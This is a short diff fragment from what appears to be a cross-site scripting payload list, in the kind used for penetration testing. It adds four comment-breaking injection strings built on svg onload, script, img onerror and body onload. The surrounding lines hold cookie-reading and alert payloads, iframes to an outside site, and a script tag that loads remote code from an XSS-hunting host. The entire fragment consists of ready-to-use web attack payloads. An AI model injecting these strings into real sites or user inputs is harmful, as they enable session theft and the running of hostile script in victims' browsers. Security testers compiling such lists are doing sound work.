@@ -39,6 +39,10 @@ javascript:prompt(document.cookie)
 <body onload=alert(123) >
 <body onload=confirm(123) >
 <body onload=prompt(123) >
+--><svg/onload=alert(document.domain)>
+--><body onload=alert(123) >
+--><script>alert(1)</script>
+--><img src=x onerror=alert(Gotcha)>
 <iframe src='https://testforiframe.site/'>
 "><iframe src='https://testforiframe.site/'>
 "><script src="https://ee.xss.ht/"></script>
